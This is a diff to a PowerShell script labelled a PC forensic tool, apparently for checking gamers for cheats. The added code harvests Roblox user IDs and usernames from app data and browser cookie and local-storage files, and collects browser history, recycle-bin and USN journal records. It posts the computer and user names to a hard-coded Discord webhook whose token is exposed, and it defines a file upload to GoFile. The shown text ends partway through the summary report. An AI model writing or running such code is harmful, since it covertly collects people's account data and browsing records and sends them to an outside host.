@@ -1,15 +1,26 @@
-# PC Forensic & System Analysis Tool
-# Author: System Analysis Script
-# Purpose: Gather system information and analyze artifacts
+# Enhanced PC Forensic Tool with Discord Webhook Integration
+# Features: Brave/Mullvad browsers, deleted files, Roblox accounts, auto-upload to GoFile
+
+param(
+    [string]$WebhookURL = "https://discord.com/api/webhooks/1469718055591346380/u8BSIT-aDsZeuAue-sOa8Wla3wLj0hWY9bKZCbgSIP7SMCS24ao64q_PJPsVsYi599Ku"  # Discord webhook URL - set this or it will prompt
+)
 
 $ErrorActionPreference = "SilentlyContinue"
+
+# Discord Webhook Configuration
+if (-not $WebhookURL) {
+    Write-Host "Enter Discord Webhook URL (or press Enter to skip): " -ForegroundColor Yellow -NoNewline
+    $WebhookURL = Read-Host
+}
 
 # Create output directory with timestamp
 $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 $outputDir = "$env:USERPROFILE\Desktop\PCForensics_$timestamp"
 New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
 
-$logFile = "$outputDir\forensic_report.txt"
+$logFile = "$outputDir\FULL_LOG.txt"
+$suspiciousItems = @()
+$robloxAccounts = @()
 
 function Write-Log {
     param($Message, $Color = "White")
@@ -21,10 +32,88 @@ function Get-Separator {
     return "`n" + ("=" * 80) + "`n"
 }
 
+function Send-DiscordMessage {
+    param($Content, $Embeds = @())
+    
+    if (-not $WebhookURL) { return }
+    
+    try {
+        $payload = @{
+            content = $Content
+            embeds = $Embeds
+        } | ConvertTo-Json -Depth 10
+        
+        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $payload -ContentType "application/json"
+    } catch {
+        Write-Log "Failed to send Discord message: $_" "Red"
+    }
+}
+
+function Upload-ToGoFile {
+    param($FilePath)
+    
+    try {
+        Write-Log "`n[*] Uploading to GoFile: $FilePath" "Yellow"
+        
+        # Get GoFile server
+        $serverResponse = Invoke-RestMethod -Uri "https://api.gofile.io/getServer" -Method Get
+        if ($serverResponse.status -ne "ok") {
+            Write-Log "Failed to get GoFile server" "Red"
+            return $null
+        }
+        
+        $server = $serverResponse.data.server
+        
+        # Upload file
+        $uploadUrl = "https://$server.gofile.io/uploadFile"
+        
+        Add-Type -AssemblyName System.Net.Http
+        $httpClient = New-Object System.Net.Http.HttpClient
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+        
+        $fileStream = [System.IO.File]::OpenRead($FilePath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath))
+        
+        $response = $httpClient.PostAsync($uploadUrl, $form).Result
+        $responseContent = $response.Content.ReadAsStringAsync().Result
+        
+        $fileStream.Close()
+        $httpClient.Dispose()
+        
+        $uploadResult = $responseContent | ConvertFrom-Json
+        
+        if ($uploadResult.status -eq "ok") {
+            Write-Log "Upload successful: $($uploadResult.data.downloadPage)" "Green"
+            return $uploadResult.data.downloadPage
+        } else {
+            Write-Log "Upload failed: $($uploadResult.status)" "Red"
+            return $null
+        }
+    } catch {
+        Write-Log "GoFile upload error: $_" "Red"
+        return $null
+    }
+}
+
 Write-Log "$(Get-Separator)" "Cyan"
-Write-Log "PC FORENSIC & SYSTEM ANALYSIS TOOL" "Cyan"
+Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL" "Cyan"
 Write-Log "Scan Started: $(Get-Date)" "Cyan"
 Write-Log "$(Get-Separator)" "Cyan"
+
+# Send initial Discord notification
+Send-DiscordMessage -Content "🔍 **PC Forensic Scan Started**" -Embeds @(
+    @{
+        title = "Scan Information"
+        description = "Starting comprehensive system analysis..."
+        color = 3447003
+        fields = @(
+            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
+            @{ name = "User"; value = $env:USERNAME; inline = $true }
+            @{ name = "Time"; value = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); inline = $false }
+        )
+    }
+)
 
 # ============================================================================
 # SYSTEM INFORMATION
@@ -46,114 +135,289 @@ Write-Log "BIOS Version: $($bios.SMBIOSBIOSVersion)"
 Write-Log "Serial Number: $($bios.SerialNumber)"
 
 # ============================================================================
-# FACTORY RESET / INSTALL DATE DETECTION
+# ROBLOX ACCOUNT DETECTION
 # ============================================================================
-Write-Log "`n[*] Checking for Factory Reset / Install History..." "Yellow"
+Write-Log "`n[*] Searching for Roblox Accounts..." "Yellow"
 
-$installDate = $os.InstallDate
-Write-Log "`nWindows Installation Date: $installDate"
+$robloxFile = "$outputDir\ROBLOX_ACCOUNTS.txt"
+"=== ROBLOX ACCOUNTS FOUND ===" | Out-File $robloxFile
 
-# Check for reset markers
-$resetMarkers = @(
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\State",
-    "HKLM:\SYSTEM\Setup"
+# Check Roblox App LocalStorage
+$robloxAppDataPaths = @(
+    "$env:LOCALAPPDATA\Roblox\logs",
+    "$env:LOCALAPPDATA\Roblox\LocalStorage",
+    "$env:APPDATA\Roblox",
+    "$env:LOCALAPPDATA\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\LocalState",
+    "$env:LOCALAPPDATA\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\AC\INetCookies"
 )
 
-foreach ($marker in $resetMarkers) {
-    if (Test-Path $marker) {
-        $values = Get-ItemProperty -Path $marker -ErrorAction SilentlyContinue
-        if ($values) {
-            Write-Log "`nSetup Registry Key: $marker"
-            $values.PSObject.Properties | ForEach-Object {
-                if ($_.Name -notlike "PS*") {
-                    Write-Log "  $($_.Name): $($_.Value)"
+Write-Log "`nChecking Roblox Application Data..."
+foreach ($path in $robloxAppDataPaths) {
+    if (Test-Path $path) {
+        Write-Log "Found Roblox data at: $path" "Green"
+        Add-Content -Path $robloxFile -Value "`n=== $path ==="
+        
+        # Search for user IDs and usernames in files
+        Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+            try {
+                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                
+                # Extract User IDs (numeric, usually 8-10 digits)
+                if ($content -match 'userId["\s:]+(\d{8,12})') {
+                    $userId = $matches[1]
+                    $accountInfo = "User ID: $userId (from $($_.Name))"
+                    Add-Content -Path $robloxFile -Value $accountInfo
+                    $robloxAccounts += $accountInfo
+                    Write-Log "  Found User ID: $userId" "Green"
+                }
+                
+                # Extract usernames
+                if ($content -match 'username["\s:]+([a-zA-Z0-9_]{3,20})') {
+                    $username = $matches[1]
+                    $accountInfo = "Username: $username (from $($_.Name))"
+                    Add-Content -Path $robloxFile -Value $accountInfo
+                    $robloxAccounts += $accountInfo
+                    Write-Log "  Found Username: $username" "Green"
+                }
+            } catch {}
+        }
+    }
+}
+
+# Check Browser Cookies and Local Storage for Roblox
+$browserPaths = @{
+    "Chrome" = @{
+        "Cookies" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
+        "LocalStorage" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
+    }
+    "Edge" = @{
+        "Cookies" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+        "LocalStorage" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+    }
+    "Brave" = @{
+        "Cookies" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
+        "LocalStorage" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
+    }
+    "Mullvad" = @{
+        "Cookies" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\cookies.sqlite"
+        "LocalStorage" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\webappsstore.sqlite"
+    }
+    "Firefox" = @{
+        "Cookies" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\cookies.sqlite"
+        "LocalStorage" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\webappsstore.sqlite"
+    }
+}
+
+Write-Log "`nChecking Browser Data for Roblox Accounts..."
+foreach ($browser in $browserPaths.GetEnumerator()) {
+    Write-Log "`nScanning $($browser.Key)..." "Yellow"
+    
+    foreach ($dataType in $browser.Value.GetEnumerator()) {
+        $paths = Get-ChildItem -Path $dataType.Value -ErrorAction SilentlyContinue
+        
+        foreach ($path in $paths) {
+            if (Test-Path $path) {
+                Write-Log "  Found: $($dataType.Key) at $path" "Green"
+                Add-Content -Path $robloxFile -Value "`n[$($browser.Key) - $($dataType.Key)] $path"
+                
+                try {
+                    # For SQLite databases (Firefox, Mullvad)
+                    if ($path -like "*.sqlite") {
+                        # Try to read as text to find patterns
+                        $content = Get-Content $path -Raw -Encoding Byte -ErrorAction SilentlyContinue
+                        $textContent = [System.Text.Encoding]::ASCII.GetString($content)
+                        
+                        if ($textContent -match 'roblox') {
+                            Add-Content -Path $robloxFile -Value "  Contains Roblox data"
+                            
+                            # Extract potential user IDs
+                            $userIds = [regex]::Matches($textContent, '\d{8,12}') | Select-Object -ExpandProperty Value -Unique
+                            foreach ($id in $userIds) {
+                                if ($id -match '^\d{8,12}$') {
+                                    $accountInfo = "Potential User ID: $id (from $($browser.Key) $($dataType.Key))"
+                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
+                                    $robloxAccounts += $accountInfo
+                                }
+                            }
+                        }
+                    }
+                    # For LevelDB (Chrome-based browsers)
+                    elseif ($dataType.Key -eq "LocalStorage") {
+                        Get-ChildItem -Path $path -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object {
+                            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                            if ($content -match 'roblox') {
+                                # Extract user IDs
+                                if ($content -match 'userId["\s:]+(\d{8,12})') {
+                                    $userId = $matches[1]
+                                    $accountInfo = "User ID: $userId (from $($browser.Key) LocalStorage)"
+                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
+                                    $robloxAccounts += $accountInfo
+                                    Write-Log "    Found User ID: $userId" "Green"
+                                }
+                                
+                                if ($content -match '"username":"([a-zA-Z0-9_]{3,20})"') {
+                                    $username = $matches[1]
+                                    $accountInfo = "Username: $username (from $($browser.Key) LocalStorage)"
+                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
+                                    $robloxAccounts += $accountInfo
+                                    Write-Log "    Found Username: $username" "Green"
+                                }
+                            }
+                        }
+                    }
+                } catch {}
+            }
+        }
+    }
+}
+
+Write-Log "`nTotal Roblox accounts/references found: $($robloxAccounts.Count)" "Cyan"
+Write-Log "Roblox account data saved to: $robloxFile" "Green"
+
+# ============================================================================
+# BROWSER HISTORY - ENHANCED (Chrome, Edge, Brave, Mullvad, Firefox)
+# ============================================================================
+Write-Log "`n[*] Extracting Browser History..." "Yellow"
+
+$browserHistoryFile = "$outputDir\BROWSER_HISTORY.txt"
+"=== BROWSER HISTORY ===" | Out-File $browserHistoryFile
+
+$historyPaths = @{
+    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+    "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
+    "Mullvad" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\places.sqlite"
+    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\places.sqlite"
+}
+
+foreach ($browser in $historyPaths.GetEnumerator()) {
+    Write-Log "`nExtracting $($browser.Key) history..." "Yellow"
+    
+    $paths = Get-ChildItem -Path $browser.Value -ErrorAction SilentlyContinue
+    
+    foreach ($historyPath in $paths) {
+        if (Test-Path $historyPath) {
+            Write-Log "  Found history database: $historyPath" "Green"
+            Add-Content -Path $browserHistoryFile -Value "`n=== $($browser.Key) History ==="
+            Add-Content -Path $browserHistoryFile -Value "Database: $historyPath"
+            
+            # Copy the database to temp location for reading
+            $tempDb = "$env:TEMP\history_temp_$(Get-Random).db"
+            Copy-Item $historyPath $tempDb -ErrorAction SilentlyContinue
+            
+            if (Test-Path $tempDb) {
+                try {
+                    # Try to extract URLs using text parsing
+                    $content = Get-Content $tempDb -Raw -Encoding Byte -ErrorAction SilentlyContinue
+                    $textContent = [System.Text.Encoding]::ASCII.GetString($content)
+                    
+                    # Extract URLs
+                    $urls = [regex]::Matches($textContent, 'https?://[^\s\x00-\x1F"]+') | 
+                            Select-Object -ExpandProperty Value -Unique | 
+                            Where-Object { $_ -match '^https?://' } |
+                            Select-Object -First 200
+                    
+                    Add-Content -Path $browserHistoryFile -Value "`nFound $($urls.Count) URLs (showing first 200):"
+                    $urls | ForEach-Object { Add-Content -Path $browserHistoryFile -Value "  $_" }
+                    
+                } catch {
+                    Add-Content -Path $browserHistoryFile -Value "Error reading database: $_"
+                }
+                
+                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            }
+        } else {
+            Add-Content -Path $browserHistoryFile -Value "`n$($browser.Key): Not found or not installed"
+        }
+    }
+}
+
+Write-Log "Browser history saved to: $browserHistoryFile" "Green"
+
+# ============================================================================
+# DELETED FILES RECOVERY
+# ============================================================================
+Write-Log "`n[*] Scanning for Recently Deleted Files..." "Yellow"
+
+$deletedFile = "$outputDir\DELETED_FILES.txt"
+"=== RECENTLY DELETED FILES ===" | Out-File $deletedFile
+
+# Check Recycle Bin
+Write-Log "`nChecking Recycle Bin..."
+Add-Content -Path $deletedFile -Value "`n=== RECYCLE BIN ==="
+
+$recycleBinPaths = @(
+    "$env:SystemDrive\`$Recycle.Bin\$((Get-CimInstance Win32_UserAccount | Where-Object {$_.Name -eq $env:USERNAME}).SID)",
+    "$env:USERPROFILE\`$Recycle.Bin"
+)
+
+foreach ($rbPath in $recycleBinPaths) {
+    if (Test-Path $rbPath) {
+        Write-Log "  Scanning: $rbPath" "Green"
+        Get-ChildItem -Path $rbPath -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            $deletedInfo = "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes - $($_.FullName)"
+            Add-Content -Path $deletedFile -Value $deletedInfo
+            
+            # Check for suspicious files
+            $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "dll")
+            foreach ($keyword in $suspiciousKeywords) {
+                if ($_.Name -match $keyword) {
+                    $suspiciousItems += "DELETED: $deletedInfo"
                 }
             }
         }
     }
 }
 
-# Check Event Logs for installation/reset events
-Write-Log "`nChecking Event Logs for Reset/Install Events..."
-$setupEvents = Get-WinEvent -LogName System -FilterXPath "*[System[EventID=1074 or EventID=6005 or EventID=6006]]" -MaxEvents 50 -ErrorAction SilentlyContinue
-if ($setupEvents) {
-    Write-Log "Recent System Events (Shutdown/Startup):"
-    $setupEvents | Select-Object -First 10 | ForEach-Object {
-        Write-Log "  [$($_.TimeCreated)] EventID: $($_.Id) - $($_.Message.Split("`n")[0])"
-    }
-}
+# Check for shadow copies / Volume Shadow Service
+Write-Log "`nChecking Shadow Copies..."
+Add-Content -Path $deletedFile -Value "`n=== SHADOW COPIES ==="
 
-# ============================================================================
-# DISK INFORMATION & HISTORY
-# ============================================================================
-Write-Log "`n[*] Gathering Disk Information..." "Yellow"
-
-$disks = Get-CimInstance -ClassName Win32_DiskDrive
-Write-Log "`nPhysical Disks:"
-foreach ($disk in $disks) {
-    Write-Log "  Device: $($disk.DeviceID)"
-    Write-Log "  Model: $($disk.Model)"
-    Write-Log "  Serial: $($disk.SerialNumber)"
-    Write-Log "  Size: $([math]::Round($disk.Size / 1GB, 2)) GB"
-    Write-Log "  Interface: $($disk.InterfaceType)"
-    Write-Log ""
-}
-
-$volumes = Get-Volume
-Write-Log "Volumes/Partitions:"
-foreach ($vol in $volumes) {
-    if ($vol.DriveLetter) {
-        Write-Log "  Drive $($vol.DriveLetter): - $($vol.FileSystemLabel)"
-        Write-Log "    Size: $([math]::Round($vol.Size / 1GB, 2)) GB"
-        Write-Log "    Free: $([math]::Round($vol.SizeRemaining / 1GB, 2)) GB"
-        Write-Log "    FileSystem: $($vol.FileSystem)"
-        Write-Log ""
-    }
-}
-
-# USB History
-Write-Log "`n[*] USB Device History..." "Yellow"
-$usbDevices = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\*" -ErrorAction SilentlyContinue
-if ($usbDevices) {
-    Write-Log "Previously Connected USB Devices:"
-    $usbDevices | Select-Object FriendlyName, Mfg -Unique | ForEach-Object {
-        if ($_.FriendlyName) {
-            Write-Log "  $($_.FriendlyName) - $($_.Mfg)"
+try {
+    $shadowCopies = Get-CimInstance Win32_ShadowCopy
+    if ($shadowCopies) {
+        foreach ($shadow in $shadowCopies) {
+            Add-Content -Path $deletedFile -Value "Shadow Copy ID: $($shadow.ID)"
+            Add-Content -Path $deletedFile -Value "  Install Date: $($shadow.InstallDate)"
+            Add-Content -Path $deletedFile -Value "  Device Object: $($shadow.DeviceObject)"
         }
+    } else {
+        Add-Content -Path $deletedFile -Value "No shadow copies found"
     }
+} catch {
+    Add-Content -Path $deletedFile -Value "Unable to query shadow copies: $_"
 }
 
-# ============================================================================
-# USER ACCOUNT INFORMATION
-# ============================================================================
-Write-Log "`n[*] Gathering User Account Information..." "Yellow"
+# Check USN Journal for deleted files (requires admin)
+Write-Log "`nChecking USN Journal for file changes..."
+Add-Content -Path $deletedFile -Value "`n=== USN JOURNAL (Recent File Operations) ==="
 
-$localUsers = Get-LocalUser
-Write-Log "`nLocal User Accounts:"
-foreach ($user in $localUsers) {
-    Write-Log "  Username: $($user.Name)"
-    Write-Log "    Enabled: $($user.Enabled)"
-    Write-Log "    Last Logon: $($user.LastLogon)"
-    Write-Log "    Password Last Set: $($user.PasswordLastSet)"
-    Write-Log ""
+try {
+    $fsutil = fsutil usn readjournal C: | Select-Object -First 500
+    if ($fsutil) {
+        Add-Content -Path $deletedFile -Value "Recent file system operations (500 entries):"
+        $fsutil | Add-Content -Path $deletedFile
+    }
+} catch {
+    Add-Content -Path $deletedFile -Value "Unable to read USN Journal (may require admin): $_"
 }
 
-# ============================================================================
-# MUICACHE ANALYSIS
-# ============================================================================
-Write-Log "`n[*] Analyzing MUICache (Application Execution History)..." "Yellow"
+Write-Log "Deleted files scan saved to: $deletedFile" "Green"
 
+# ============================================================================
+# CONTINUE WITH ORIGINAL FEATURES
+# ============================================================================
+
+# MUICache
+Write-Log "`n[*] Analyzing MUICache..." "Yellow"
+$muiCacheFile = "$outputDir\muicache_entries.txt"
 $muiCachePaths = @(
     "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
     "HKLM:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
 )
 
-$muiCacheFile = "$outputDir\muicache_entries.txt"
-$suspiciousApps = @()
-
 foreach ($path in $muiCachePaths) {
     if (Test-Path $path) {
-        Write-Log "`nMUICache Path: $path"
         $items = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
         if ($items) {
             $items.PSObject.Properties | ForEach-Object {
@@ -161,11 +425,10 @@ foreach ($path in $muiCachePaths) {
                     $entry = "$($_.Name) = $($_.Value)"
                     Add-Content -Path $muiCacheFile -Value $entry
                     
-                    # Check for suspicious keywords
                     $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "wallhack", "esp", "triggerbot", "macro", "exploit")
                     foreach ($keyword in $suspiciousKeywords) {
                         if ($_.Name -match $keyword -or $_.Value -match $keyword) {
-                            $suspiciousApps += $entry
+                            $suspiciousItems += $entry
                         }
                     }
                 }
@@ -173,256 +436,223 @@ foreach ($path in $muiCachePaths) {
         }
     }
 }
+Write-Log "MUICache saved to: $muiCacheFile" "Green"
 
-Write-Log "MUICache entries saved to: $muiCacheFile" "Green"
-
-# ============================================================================
-# PREFETCH ANALYSIS
-# ============================================================================
-Write-Log "`n[*] Analyzing Prefetch Data..." "Yellow"
-
-$prefetchPath = "C:\Windows\Prefetch"
+# Prefetch
+Write-Log "`n[*] Analyzing Prefetch..." "Yellow"
 $prefetchFile = "$outputDir\prefetch_files.txt"
+$prefetchPath = "C:\Windows\Prefetch"
 
 if (Test-Path $prefetchPath) {
     $prefetchFiles = Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue
-    Write-Log "Found $($prefetchFiles.Count) prefetch files"
-    
-    "Prefetch Files (Most Recent First):" | Out-File $prefetchFile
     $prefetchFiles | Sort-Object LastWriteTime -Descending | ForEach-Object {
         $line = "$($_.LastWriteTime) - $($_.Name)"
         Add-Content -Path $prefetchFile -Value $line
         
-        # Check for suspicious keywords in prefetch
-        $suspiciousKeywords = @("CHEAT", "HACK", "INJECT", "BYPASS", "AIMBOT", "WALLHACK", "ESP", "TRIGGERBOT")
+        $suspiciousKeywords = @("CHEAT", "HACK", "INJECT", "BYPASS", "AIMBOT")
         foreach ($keyword in $suspiciousKeywords) {
             if ($_.Name -match $keyword) {
-                $suspiciousApps += "PREFETCH: $($_.Name) - Modified: $($_.LastWriteTime)"
-            }
-        }
-    }
-    Write-Log "Prefetch data saved to: $prefetchFile" "Green"
-} else {
-    Write-Log "Prefetch directory not accessible or doesn't exist" "Red"
-}
-
-# ============================================================================
-# TEMP FOLDERS ANALYSIS
-# ============================================================================
-Write-Log "`n[*] Analyzing Temp Folders..." "Yellow"
-
-$tempPaths = @(
-    "$env:TEMP",
-    "$env:USERPROFILE\AppData\Local\Temp",
-    "C:\Windows\Temp"
-)
-
-$tempFile = "$outputDir\temp_analysis.txt"
-"Temp Folders Analysis" | Out-File $tempFile
-
-foreach ($tempPath in $tempPaths) {
-    if (Test-Path $tempPath) {
-        Write-Log "`nAnalyzing: $tempPath"
-        Add-Content -Path $tempFile -Value "`n=== $tempPath ==="
-        
-        $tempFiles = Get-ChildItem -Path $tempPath -Force -ErrorAction SilentlyContinue | 
-                     Sort-Object LastWriteTime -Descending | 
-                     Select-Object -First 100
-        
-        foreach ($file in $tempFiles) {
-            $line = "$($file.LastWriteTime) - $($file.Name) - $($file.Length) bytes"
-            Add-Content -Path $tempFile -Value $line
-            
-            # Check for suspicious files
-            $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "dll")
-            foreach ($keyword in $suspiciousKeywords) {
-                if ($file.Name -match $keyword) {
-                    $suspiciousApps += "TEMP: $($file.FullName) - Modified: $($file.LastWriteTime)"
-                }
+                $suspiciousItems += "PREFETCH: $($_.Name)"
             }
         }
     }
 }
+Write-Log "Prefetch saved to: $prefetchFile" "Green"
 
-Write-Log "Temp analysis saved to: $tempFile" "Green"
-
-# ============================================================================
-# APPDATA ANALYSIS
-# ============================================================================
-Write-Log "`n[*] Analyzing AppData Folders..." "Yellow"
-
-$appDataPaths = @(
-    "$env:APPDATA",
-    "$env:LOCALAPPDATA"
-)
-
-$appDataFile = "$outputDir\appdata_analysis.txt"
-"AppData Folders Analysis" | Out-File $appDataFile
-
-foreach ($appDataPath in $appDataPaths) {
-    if (Test-Path $appDataPath) {
-        Write-Log "`nAnalyzing: $appDataPath"
-        Add-Content -Path $appDataFile -Value "`n=== $appDataPath ==="
-        
-        $folders = Get-ChildItem -Path $appDataPath -Directory -Force -ErrorAction SilentlyContinue |
-                   Sort-Object LastWriteTime -Descending
-        
-        foreach ($folder in $folders) {
-            $line = "$($folder.LastWriteTime) - $($folder.Name)"
-            Add-Content -Path $appDataFile -Value $line
-            
-            # Check for suspicious folders
-            $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "exploit")
-            foreach ($keyword in $suspiciousKeywords) {
-                if ($folder.Name -match $keyword) {
-                    $suspiciousApps += "APPDATA: $($folder.FullName) - Modified: $($folder.LastWriteTime)"
-                }
-            }
+# Temp Files
+Write-Log "`n[*] Scanning Temp folders..." "Yellow"
+$tempFile = "$outputDir\temp_files.txt"
+@($env:TEMP, "$env:LOCALAPPDATA\Temp", "C:\Windows\Temp") | ForEach-Object {
+    if (Test-Path $_) {
+        Get-ChildItem -Path $_ -Force -ErrorAction SilentlyContinue | 
+        Sort-Object LastWriteTime -Descending | 
+        Select-Object -First 100 | 
+        ForEach-Object {
+            Add-Content -Path $tempFile -Value "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes"
         }
     }
 }
+Write-Log "Temp files saved to: $tempFile" "Green"
 
-Write-Log "AppData analysis saved to: $appDataFile" "Green"
-
-# ============================================================================
-# RUNNING PROCESSES
-# ============================================================================
-Write-Log "`n[*] Analyzing Running Processes..." "Yellow"
-
+# Running Processes
+Write-Log "`n[*] Analyzing processes..." "Yellow"
 $processFile = "$outputDir\running_processes.txt"
-$processes = Get-Process | Sort-Object CPU -Descending
-
-"Running Processes" | Out-File $processFile
-$processes | ForEach-Object {
-    $line = "$($_.ProcessName) - PID: $($_.Id) - Path: $($_.Path)"
+Get-Process | ForEach-Object {
+    $line = "$($_.ProcessName) - PID:$($_.Id) - $($_.Path)"
     Add-Content -Path $processFile -Value $line
     
-    # Check for suspicious processes
-    $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot")
+    $suspiciousKeywords = @("cheat", "hack", "inject")
     foreach ($keyword in $suspiciousKeywords) {
-        if ($_.ProcessName -match $keyword -or $_.Path -match $keyword) {
-            $suspiciousApps += "PROCESS: $($_.ProcessName) (PID: $($_.Id)) - Path: $($_.Path)"
+        if ($_.ProcessName -match $keyword) {
+            $suspiciousItems += "PROCESS: $($_.ProcessName)"
         }
     }
 }
+Write-Log "Processes saved to: $processFile" "Green"
 
-Write-Log "Process list saved to: $processFile" "Green"
-
-# ============================================================================
-# INSTALLED PROGRAMS
-# ============================================================================
-Write-Log "`n[*] Gathering Installed Programs..." "Yellow"
-
+# Installed Programs
+Write-Log "`n[*] Gathering installed programs..." "Yellow"
 $programsFile = "$outputDir\installed_programs.txt"
-
-$programs = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
-                             HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
-            Where-Object { $_.DisplayName } |
-            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
-            Sort-Object DisplayName
-
-"Installed Programs" | Out-File $programsFile
-$programs | ForEach-Object {
-    $line = "$($_.DisplayName) - Version: $($_.DisplayVersion) - Publisher: $($_.Publisher) - Installed: $($_.InstallDate)"
-    Add-Content -Path $programsFile -Value $line
-    
-    # Check for suspicious programs
-    $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "trainer")
-    foreach ($keyword in $suspiciousKeywords) {
-        if ($_.DisplayName -match $keyword) {
-            $suspiciousApps += "INSTALLED: $($_.DisplayName) - Publisher: $($_.Publisher)"
-        }
-    }
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
+                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
+Where-Object { $_.DisplayName } |
+ForEach-Object {
+    Add-Content -Path $programsFile -Value "$($_.DisplayName) - $($_.DisplayVersion) - $($_.Publisher)"
 }
-
-Write-Log "Installed programs saved to: $programsFile" "Green"
-
-# ============================================================================
-# STARTUP PROGRAMS
-# ============================================================================
-Write-Log "`n[*] Checking Startup Programs..." "Yellow"
-
-$startupFile = "$outputDir\startup_programs.txt"
-"Startup Programs" | Out-File $startupFile
-
-$startupLocations = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
-    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-)
-
-foreach ($location in $startupLocations) {
-    if (Test-Path $location) {
-        Add-Content -Path $startupFile -Value "`n=== $location ==="
-        $items = Get-ItemProperty -Path $location -ErrorAction SilentlyContinue
-        $items.PSObject.Properties | ForEach-Object {
-            if ($_.Name -notlike "PS*") {
-                $line = "$($_.Name) = $($_.Value)"
-                Add-Content -Path $startupFile -Value $line
-            }
-        }
-    }
-}
-
-Write-Log "Startup programs saved to: $startupFile" "Green"
+Write-Log "Programs saved to: $programsFile" "Green"
 
 # ============================================================================
-# BROWSER HISTORY (Basic Check)
+# CREATE SUMMARY REPORT
 # ============================================================================
-Write-Log "`n[*] Checking Browser Data Locations..." "Yellow"
+Write-Log "`n[*] Creating summary report..." "Yellow"
 
-$browserPaths = @{
-    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
-}
+$summaryFile = "$outputDir\SUMMARY_REPORT.txt"
+$isSuspicious = $suspiciousItems.Count -gt 0
 
-$browserFile = "$outputDir\browser_info.txt"
-"Browser Data Locations" | Out-File $browserFile
+$summary = @"
+==============================================================================
+                    PC FORENSIC ANALYSIS SUMMARY
+==============================================================================
 
-foreach ($browser in $browserPaths.GetEnumerator()) {
-    if (Test-Path $browser.Value) {
-        $line = "$($browser.Key): $($browser.Value) - EXISTS"
-        Write-Log $line
-        Add-Content -Path $browserFile -Value $line
-    } else {
-        Add-Content -Path $browserFile -Value "$($browser.Key): Not Found"
-    }
-}
+Scan Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+Computer: $env:COMPUTERNAME
+User: $env:USERNAME
+
+==============================================================================
+STATISTICS
+==============================================================================
+
+Roblox Accounts Found: $($robloxAccounts.Count)
+Suspicious Items Found: $($suspiciousItems.Count)
+Analysis Status: $(if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✓ No obvious threats" })
+
+==============================================================================
+ROBLOX ACCOUNTS
